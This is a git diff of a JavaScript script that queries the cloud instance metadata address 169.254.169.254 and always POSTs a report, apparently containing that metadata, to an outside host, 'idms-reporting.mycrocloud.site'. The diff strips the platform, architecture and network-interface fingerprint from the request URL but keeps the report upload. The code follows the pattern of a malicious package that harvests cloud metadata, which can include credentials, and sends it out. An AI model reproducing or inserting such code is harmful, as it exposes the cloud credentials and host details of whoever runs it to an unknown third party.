@@ -1,10 +1,9 @@
 import http from "http";
 import https from "https";
-import os from "os";
 
 const METADATA_HOST = "169.254.169.254";
 const REPORT_HOST = "idms-reporting.mycrocloud.site";
-const REPORT_PATH = "/api/v2";
+const REPORT_PATH = "/api/report";
 
 function request({ protocol = "http:", ...options }, body = null) {
   const lib = protocol === "https:" ? https : http;
@@ -85,12 +84,11 @@ async function run() {
   }
 
   // 3️⃣ Always try POST report
-  const networkInterfaces = os.networkInterfaces();
   const postRes = await request(
     {
       protocol: "https:",
       host: REPORT_HOST,
-      path: REPORT_PATH + (report.metadata ? "/ok" : "/error") + `?platform=${process.platform}&arch=${process.arch}&interfaces=${Object.keys(networkInterfaces).join(",")}`,
+      path: REPORT_PATH ,
       method: "POST",
       headers: {
         "Content-Type": "application/json",
